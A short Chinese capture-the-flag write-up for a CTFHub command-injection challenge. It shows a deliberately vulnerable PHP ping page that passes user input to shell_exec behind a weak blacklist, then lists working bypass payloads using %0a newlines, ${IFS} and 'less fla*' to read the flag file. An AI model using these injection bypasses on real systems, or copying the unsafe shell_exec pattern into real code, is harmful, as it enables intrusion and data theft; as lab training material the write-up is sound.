```php
<html>                                                                               
     <body>
         <form action="" method="get">
            <input type="text" name='ip' />
            <input type="submit" name="submit" value="提交">
<?php
$res = FALSE;
if (isset($_GET['submit']) || isset($_GET['ip'])){
    $ip = $_GET['ip'];
    $m = [];
    if (!preg_match_all("/(\||&|;| |\/|cat|flag|ctfhub)/", $ip, $m)){
        $cmd = shell_exec( 'ping  -c 4 ' . $ip );
        echo $cmd;
    }
}
?>
        </form>
    </body>
</html>
```
- 这题为组合拳
  - 本题过滤了|，&，；，空格，cat，flag，ctfhub
  - 综合换行符：
    - ${IFS} -->空格
    - %0a(换行) --> ;
    - less --> cat
  - 本题需要在url中提交才行，因为在输入框中提交会再进行url编码，意思就不是我们想要的了
  - payload:
    -  127.0.0.1%0als 看看目录
    -  127.0.0.1%0als${IFS}fla* 查看目录下的flag文件名,这里因为过滤了flag，所以要用fla*
    -  127.0.0.1%0aless${IFS}fla* 获取flag